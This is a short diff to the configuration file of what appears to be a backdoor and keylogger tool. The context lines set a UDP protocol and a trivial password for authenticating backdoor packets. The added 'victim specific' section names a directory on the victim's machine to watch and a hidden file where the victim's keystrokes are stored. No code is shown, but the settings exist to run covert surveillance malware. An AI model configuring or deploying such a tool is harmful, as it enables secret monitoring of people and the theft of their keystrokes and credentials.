@@ -28,3 +28,12 @@ protocol = "udp"
 
 # Password to authenticate backdoor packets
 auth_password = "a"
+
+
+############################ VICTIM SPECIFIC ############################
+
+# Path to monitor
+watch_path = "/home/sy/Downloads"
+
+# Keylog file for victim to store keystrokes
+victim_keylog_file = ".keylog.txt"
